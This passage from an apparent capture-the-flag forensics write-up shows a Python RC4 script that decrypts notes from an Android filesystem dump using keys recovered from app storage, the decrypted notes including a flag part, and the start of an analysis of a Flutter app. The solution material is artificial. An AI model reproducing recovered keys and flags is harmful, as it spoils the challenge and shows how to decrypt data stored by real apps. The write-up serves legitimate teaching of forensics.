style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key[j \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key)]) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        tmp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[j] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[i]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> stream_generation\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(sched):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    j \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    while\u003C/span>\u003Cspan style=\"color:#79B8FF\"> True\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        j \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        tmp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[j] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[i]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        yield\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[(sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> decrypt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(ciphertext, key):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    key \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">ord\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(char) \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> char \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    sched \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key_scheduling(key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    key_stream \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> stream_generation(sched)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # Parse hex values from format: 0xXX0xYY0xZZ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    hex_values \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> []\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(ciphertext):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ciphertext[i:i\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '0x'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            j \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(ciphertext) \u003C/span>\u003Cspan style=\"color:#F97583\">and\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ciphertext[j:j\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '0x'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                j \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            hex_val \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ciphertext[i:j]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            hex_values.append(\u003C/span>\u003Cspan style=\"color:#79B8FF\">int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(hex_val, \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        else\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            i \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    plaintext \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> encrypted_byte \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> hex_values:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        decrypted_byte \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> encrypted_byte \u003C/span>\u003Cspan style=\"color:#F97583\">^\u003C/span>\u003Cspan style=\"color:#79B8FF\"> next\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key_stream)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        plaintext \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> chr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(decrypted_byte)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> plaintext\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Keys from client storage\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">KEYS\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175732777833\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"1OmIyq5YT50YlWB0\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175747121993\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"oIdeaSz9iySlAmKJ\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175936114230\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"YKnQqnrzfTIM9HLu\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025180002742685\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"RhjZrO2JGKQLamST\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175724299736\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SkZFksurgEq3Tdhe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175950593733\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"M52JUgdj9r6kkVg4\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"15052025175944264611\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"lunMORQQjKhX9u5H\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"=\"\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">70\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"DECRYPTING ALL NOTES\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"=\"\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">70\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> filename, key \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> KEYS\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.items():\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os.path.exists(filename):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n{\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'='\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">70}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"File: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">filename\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Key: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">key\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'='\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">70}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(filename, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'r'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            ciphertext \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f.read()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        try\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            plaintext \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> decrypt(ciphertext, key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Decrypted content:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">plaintext\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        except\u003C/span>\u003Cspan style=\"color:#79B8FF\"> Exception\u003C/span>\u003Cspan style=\"color:#F97583\"> as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> e:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Error decrypting: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">e\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'='\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">70}\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    else\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"File not found: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">filename\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">✓ Decryption complete!\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175732777833:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"well this was easy\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175747121993:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"i'll give you the first part of the flag :)\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175936114230:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"first part of the flag: w311_7h47_p4r7_w45_345y\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025180002742685:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"f4k3_f14g\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175724299736:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"hello there\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175950593733:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"boop\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">15052025175944264611:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"hehehe\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>After an hour of going through all the files i found this snapshots folder  ( i tried organising the files by images , txt , png etc and came across this title 0\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-8.png\" alt=\"Snapshots Folder\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-9.png\" alt=\"App Screenshot\">\u003C/p>\n\u003Cp>After analyzing the Android filesystem dump, we identified two key applications in the \u003Ccode>/data/app/\u003C/code> directory:\u003C/p>\n\u003Col>\n\u003Cli>\u003Ccode>com.sp3p3x.notesapp\u003C/code> - A notes application (already analyzed for flagPart1)\u003C/li>\n\u003Cli>\u003Ccode>com.example.accessmydata\u003C/code> - The target application for flagPart2\u003C/li>\n\u003C/ol>\n\u003Cp>The challenge description hinted at finding deleted data from a “realm db”, and a screenshot found in \u003Ccode>/data/system_ce/0/snapshots/\u003C/code> confirmed the existence of an app that downloads and decrypts a realm file\u003C/p>\n\u003Cp>The Access My Data APK was found at:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>/data/app/~~hvxKjg-YJ69UXXtnoCmWcw==/com.example.accessmydata-rkCVbU6Yb-jHyAaRmU8b0Q==/base.apk\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Terminal output:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> find\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /data/app\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -name\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"*accessmydata*\"\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -name\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"*.apk\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">/data/app/~~hvxKjg-YJ69UXXtnoCmWcw\u003C/span>\u003Cspan style=\"color:#9ECBFF\">==/com.example.accessmydata-rkCVbU6Yb-jHyAaRmU8b0Q==/base.apk\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> base.apk\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 21M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> May\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 15\u003C/span>\u003Cspan style=\"color:#79B8FF\">  2025\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> base.apk\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Flutter applications are unique in the Android ecosystem because they don’t use traditional Java/Kotlin code. Instead, they compile Dart code to native machine code using Ahead-Of-Time (AOT) compilation. This results in two important native libraries:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>libflutter.so\u003C/strong> - The Flutter engine (shared across all Flutter apps)\u003C/li>\n\u003Cli>\u003Cstrong>libapp.so\u003C/strong> - The application-specific code compiled from Dart\u003C/li>\n\u003C/ol>\n\u003Cp>The Dart code is embedded within \u003Ccode>libapp.so\u003C/code> as a snapshot, which contains:\u003C/p>\n\u003Cul>\n\u003Cli>Compiled Dart VM bytecode\u003C/li>\n\u003Cli>AOT-compiled native 